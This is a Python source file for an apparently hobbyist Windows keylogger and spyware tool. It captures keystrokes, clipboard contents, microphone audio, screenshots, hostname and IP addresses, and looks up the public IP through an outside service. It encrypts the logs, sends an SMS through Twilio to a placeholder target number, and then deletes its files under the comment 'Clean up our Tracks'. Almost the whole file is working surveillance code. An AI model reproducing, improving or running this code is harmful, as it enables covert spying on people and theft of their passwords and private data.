# importing import libraries-------------------------------------------
import os, time, socket, platform, win32clipboard, getpass
import sounddevice as sd
from requests import get
from PIL import ImageGrab
from twilio.rest import Client
from scipy.io.wavfile import write
from cryptography.fernet import Fernet
from pynput.keyboard import Key, Listener
#-----------------------------------------------------------------------

keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

''' Twilio's credentials '''

account_sid = "TWILIO_ACCOUNT_SID"
auth_token ="TWILIO_ACCOUNT_TOKEN"
client = Client(account_sid, auth_token)

username = getpass.getuser()

''' Generate an encryption key from the Cryptography folder. '''

key = ""

''' Enter the file path where your files will be stored. '''

file_path = "D:\\Projects\\keylogger\\logs"

extend = "\\"
file_merge = file_path + extend

''' Get the computer information. '''

def computer_information():
    """
    This function will write the computer information to the system_information file.
    It will write the processor, system, machine, hostname, and private IP address.
    """
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

computer_information()

''' Get the clipboard contents. '''
def copy_clipboard():
    
    """
    This function copies the clipboard data and writes it to a file.
    The file is located in the same directory as the script.
    The file is named clipboard_information.txt
    The file is appended with the clipboard data.
    """
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")

copy_clipboard()

''' Getting the Microphone '''

def microphone():
    """
    This function records the audio from the microphone for a certain amount of time.
    The audio is saved in the file_path with the name audio_information.
    The audio is saved in the format .wav.
    The sampling rate is 44100 Hz.
    The audio is 2 channels.
    """
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)

microphone()

''' Get screenshots '''

def screenshot():
    """
    This fun Takes a screenshot of the screen and saves it to the file path.
    The file name is specified in the screenshot_information variable.
    The file extension is specified in the extend variable.
    """
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

screenshot()

number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

''' Timer for keylogger '''

while number_of_iterations < number_of_iterations_end:

    count = 0
    keys =[]

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys =[]

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:

        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        screenshot() 

        copy_clipboard()

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration


''' Encrypt Files '''
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]

count = 0

for encrypting_file in files_to_encrypt:

    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read() 

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    ''' Sending all the information to Twilio's SMS Account.'''
    message = client.messages \
    .create(
         body='CRUCIAL INFORMATION WILL BE SEND FROM HERE!',
         from_='TWILIO_PHONE_NUMBER',
         to='TARGET_PHONE_NUMBER'
     )

    print(message.sid)
    count += 1

''' Clean up our Tracks & Delete Files '''
delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
for file in delete_files:
    os.remove(file_merge + file)